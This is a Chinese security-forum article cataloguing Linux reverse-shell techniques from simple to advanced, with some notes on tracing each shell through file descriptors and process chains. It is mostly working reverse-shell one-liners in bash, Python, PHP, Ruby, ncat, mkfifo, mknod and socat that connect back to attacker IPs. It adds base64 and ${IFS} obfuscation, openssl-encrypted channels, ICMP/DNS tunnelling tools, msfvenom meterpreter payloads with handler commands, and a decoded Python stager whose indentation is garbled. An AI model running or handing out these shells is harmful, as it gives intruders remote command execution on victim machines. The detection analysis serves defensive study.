0x00 定义
=======

受害者由于某种原因**主动**向攻击者发起连接，攻击者可向受害者下发命令并得到命令执行结果，即**为反弹shell**。  
&gt; 某种原因，包括但不限于受害机器运行了远控木马（钓鱼邮件附件），存在RCE漏洞等

0x01 本质
=======

网络通信+命令执行+重定向方式

- **网络通信**：可以使用TCP/UDP/ICMP等协议，TCP协议再细分又可以包含HTTP/HTTPS协议等，UDP包含DNS等；
- **命令执行**：调用shell解释器、glibc库、Syscall等方式实现；
- **重定向**：管道、伪终端、内存文件等

0x02 攻击手法
=========

初级
--

利用系统自带的 shell 进行反弹shell，命令无混淆

### 1. 直接把shell的标准输入、输出、错误重定向到socket中（双向）

bash将标准输出、标准错误输出、标准输入通过socket链接重定向至远程

#### bash

```bash
sh -i >& /dev/tcp/172.16.0.104/1234 0>&1
```

先简单解释一下这个命令的意思  
• `0`:标准输入、`1`:标准输出、`2`:标准错误  
• `r`（可读）、`w`（可写）、`u`（可读+可写）  
• `>&`：标准输出+错误  
• `/dev/tty` 终端、`/dev/pty` 虚拟终端

一开始：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-09a00efd311771e1e1dbc08ff9c2e9323c1bae05.png)

`>& /dev/tcp/172.16.0.104/1234` 之后

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-608656206fa93b5b33b36088dda8b66146066247.png)

`0>&1`之后

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c964dd85a6da99b254fa19577ab28715e14cdf32.png)

数据流图如下:

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-a83d382a7f9bf15b8059d692d438354f2bb9f713.png)

通过反弹的端口 1234 去排查shell

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-f25e4ab0ba5b55fb85a391205b07e074a01804c6.png)

这里的shell，除了sh，还有如下：

```php
bash、pwsh、ash、bsh、csh、ksh、zsh、tcsh等
```

此外，还有很多其他的例子

#### python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.11.6",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-996b991b751cef6c450d8af8fbe9708d811f8603.png)

数据流图如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-57f38c9406451c007bf03fe5163ad7fcc1c82486.png)

#### php

```bash
php -r '$sock=fsockopen("10.0.11.6",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e65ded3e16979847e395751251bf047b10a85574.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-3e3f11b42b1dd1c855491063c7df9491e066c541.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-34028d931b6bcebfd076f48b31fbd115ccb553f3.png)

中级
--

这一阶段分成两部分，一个是基于上面命令的混淆，还有一个是引入一个“中转”的机制

### 1. 混淆（双向）

base64编码

```bash
echo "sh -i >& /dev/tcp/172.16.0.104/1234 0>&1"|base64

c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjAuMTA0LzEyMzQgMD4mMQo=
```

```bash
{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjAuMTA0LzEyMzQgMD4mMQo=}|{base64,-d}|{bash,-i}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-5398a2298827f5a03585f14ef14096e3eae006c3.png)

`${IFS}`代替空格

```bash
/bin/bash -c bash${IFS}-i${IFS}>& 172.16.0.104/1234<&1
```

### 2. 流量加密（双向）

```bash
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | openssl s_client -quiet -connect 172.16.0.104:1234 > /tmp/f
```

<https://www.cnblogs.com/heycomputer/articles/10697865.html>

这里主要讨论的是openssl流量的加密，管道在下面会分析

### 3. 中转-管道

所谓“中转”，就是shell的标准输入、输出、错误**不直接**重定向到socket  
中，而是在中间加入一个东西，即管道，然后再由管道连接 socket

不同进程之间通过管道相连接，最后通过多次管道定向至bash的输入输出

#### Ncat（双向）

```bash
ncat 10.0.11.6 1234 -e /bin/bash
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-4c3e201dd65871906ad8f74e3732f6d2ccf2f327.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-ad305a156eb500038c09cafb405475744bba8d57.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-0da03a86a1ac630357d8ae8c8217eb7ec89d691e.png)

双向证明：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-997aa84953fd46ddb3f306a16cabcbe52808a877.png)

#### mkfifo（双向）

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 172.16.0.104 1234 > /tmp/f
```

mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给`/bin/sh`，sh会执行管道里的命令并将标准输出和标准错误输出结果通过`nc`传到该管道，由此形成了一个回路

在某些变形的场景下，可能经过层层中转，但无论经过几层最终都会形成一条流动的数据通道。通过跟踪fd和进程的关系可以覆盖

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-012191f3110ead4135c8c17ad9c8c6e6f83a8ae8.png)

如下，假设我们要追查`bash -i`：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7276e67210c199a27c67a02913be2f3db65fab70.png)

上面查了639226管道，只查到了cat，下面查另一个管道639228，最终查到了nc对应的socket

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-39e7dcd05e2ae4dc804e39649940b05d852c7015.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e9a1eca8df0508bfacd628f1db29acbe567b52d8.png)

双向证明：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7d439e328d189aac2c303634bf204bfba19161a5.png)

#### mknod（双向）

```bash
mknod backpipe p; nc 10.0.11.6 1234 0<backpipe | /bin/bash 1>backpipe 2>backpipe
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b7c1cb6626049e8b966ad0b9ef5a2208fe5c6c39.png)

双向证明：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-59bc09bc097e155fa2f2649d989e1e5bf554d58c.png)

总的来说，0，1，2标准输入输出、错误输出流被指向pipe管道，管道指向到另一个进程会有一个对外的socket链接，中间或许经过多层管道，但最终被定向到的进程必有一个socket链接。

高级
--

### 1. 流量伪装

<https://github.com/krabelize/icmpdoor>  
<https://github.com/bdamele/icmpsh>  
[https://github.com/ahhh/Reverse\_DNS\_Shell](https://github.com/ahhh/Reverse_DNS_Shell)

#### Icmpdoor（单向）

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-85fa0f9a45b7b1d7eb017f6ac76ac5741c6ce73d.png)

进程链：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-4a9437ba00dbd7b788980346d2b80ee2eab2246d.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7d23d7c23696ba0d491f0694d8e76475c4d75a44.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-867fe9c778bd167eebf235899b5f85ee409980d6.png)

### 2. 标准输入由代码处理（无落地）（单向）

编程语言实现标准输入中转，重定向命令执行的输入到中转，标准输出和标准错误中转形式不限制。

```bash
python3 -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('10.0.11.6',1234))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

首先建立了一个socket，然后进入死循环。循环里面，启动了一个shell进程，输入由socket控制，输出和误都指向一个管道。命令执行完后，将输出和错误通过socket发送出去

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-611fecb4a9ad01b651470bf448a7626732bda849.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c602281984cbd3a27dd2920acf754b00c63f9783.png)

注意：

1. 执行完命令，shell立刻关闭，因此测试的时候，进行了长ping
2. 一执行命令shell就往管道写  
    查看进程链，执行同样的命令，每次启动的shell都不一样，shell执行完后就关闭了  
    这里的图片用的是旧的，所以进程id对应不上

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-cc4902a63d970ab211c3f045f0bf5a3028ee2ba5.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-4df9e9c080d6eb49fe81b47e078a3501eb5f8e5d.png)

单向证明：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c8738785514e2f7762db40ac0c01e1f2038e866a.png)

还有以下：

```bash
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('172.16.0.104',1234))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-f337401b69a7cda51331d3ebf76051b2985c6c4c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c395d4d74b8f9e0d34a6171735e8223ae96986fd.png)

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.11.6","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-677d91c05b77684e5b9d684fd0e4e68434820f61.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-9b96f4bdf4a5f8a5a211a65bf8c18371e17bb7ae.png)

### 3. 伪终端 pty

这类的攻击，特征就是shell的基本输入输出错误都重定向到了 `/dev/pts`，且恶意程序会打开`/dev/ptmx`，且会有socket外连

#### socat（双向）

```bash
# 反弹命令

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.11.6:1234

# 监听命令

socat file:`tty`,raw,echo=0 tcp-listen:1234
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-f8edaafe038f4e8aff8aa7dfce04516f8252da9e.png)

先从进程入手

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d7c9ad78b00c7f548ba6272b809bb4ae2454d115.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-fac07312756665bba87b348d306403c4d2ec06fd.png)

再在攻击者上查看当前tty，看是否是`/dev/pts/2`

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-4ca42806009e39118455f89be0ce2edd2afdfc0c.png)

#### Python（双向）

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.11.6",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-40b9d65113db429509b4d7ab9e2e1acca3ca398a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-24a6b2f80bf605a829e8362764be406ae44ff4a8.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8218eacb6fad8e9c4c8160d03df2c350bef6b154.png)

#### msf-python/meterpreter/reverse\_tcp（双向）

```bash
# 控制端
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.11.6 LPORT=1234 -f raw -o /tmp/mrtp.py

msfconsole
msf5 > use exploit/multi/handler
msf5 > set PAYLOAD python/meterpreter/reverse_tcp
msf5 > set LHOST 10.0.11.6
msf5 > set LPORT 1234
msf5 > run

# 被控端
python3 mrtp.py
```

`mrtp.py` 如下：

```python
import socket
import zlib
import base64
import struct
import time
for x in range(10):
try:
    s = socket.socket(2, socket.SOCK_STREAM)
    s.connect(('10.0.11.6', 1234))
    break
except:
    time.sleep(5)
    l = struct.unpack('>I', s.recv(4))[0]
    d = s.recv(l)
    while len(d) < l:
d += s.recv(l - len(d))
exec(zlib.decompress(base64.b64decode(d)), {'s': s})
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d6fcaa2e9c76783c1283d58ce2be4b90217f9d35.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-54933b4058d1f6635caf257a4df57beae2a2440d.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-ca5481ddbc9c6c8121615f791c746f353324010e.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8a6d498f2ecee7e3209f795b8904dd59a2f054a4.png)

双向证明：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e7e82b6538119d9a518a5476f20a4b910b722ecc.png)

### 4. 非交互式shell-远控木马

#### 1. 恶意程序负责socket通信，如 msf-meterpreter/reverse\_tcp

恶意程序负责socket通信，同时把命令写到管道1中，shell从管道1中读取命令执行，并把结果写到管道2，恶意程序从管道2中读取数据，通过socket回传给攻击者。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-13ff5328cdd6c0436f6bbeb344b4a917bceb7396.png)

```bash
# 控制端
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.11.6 LPORT=1234 -f elf -o /tmp/exp

msfconsole
msf5 > use exploit/multi/handler
msf5 > set payload linux/x64/meterpreter/reverse_tcp
msf5 > set LHOST 10.0.11.6
msf5 > set LPORT 1234
msf5 > run

# 被控端
chmod 777 exp
./exp
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-dac039087e2af38f73836cfbe7c977293141c57f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e3864a4c1ac1516c37efb5824171e74467cffa5b.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-52a1a6a5de5c4f176c6fca5e52641c577d1a4e60.png)

#### 2. 自定义shell

自定义一个shell，不使用系统自带的shell。

以 ls 命令为例子，功能是查看目录中有哪些文件，假如我们不想使用ls命令，那我们有什么办法呢？

那就自己写一个类似功能程序的代码，然后执行就可以了。

以 python shellcode为例子(你也可以写汇编 shellcode)：

```python
ls_shellcode = '''
import os

dst_path = '{dst_path}'

dirs = os.listdir(dst_path)

for file in dirs:
 print(file)

'''
exec(ls_shellcode.format(dst_path = "C:/"))
```

输出：

```php
$Recycle.Bin
DocumentsandSettings
Intel
pagefile.sys
PerfLogs
ProgramFiles
....
```

这样根本不会出现启动系统自带的shell，为了更加隐蔽，还可以把shellcode通过网络传输。

再看现有的解决方案：以 <https://github.com/rapid7/mettle> 为例子，内置了一些的常用命令

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e0bae43ce900c96a7b3f9b8ce316cc311bf24a8f.png)

具体代码本人还在研究中。。。

0x03 总结
=======

这是我自己对linux反弹shell的一些理解，也是按照我自己的理解对其进行了分级，分成初中高级。。。可能会存在争论，又或者有一些我不曾知道的手法，欢迎各位师傅一起讨论啊！

在学习研究过程中，也参考了一些师傅的文章，因为时间太过长远了，已经忘了参考了哪些文章了，如果师傅们在看本文的过程中，发现有一些思路有师傅写过，需要我加上参考链接的，欢迎随时Q我：）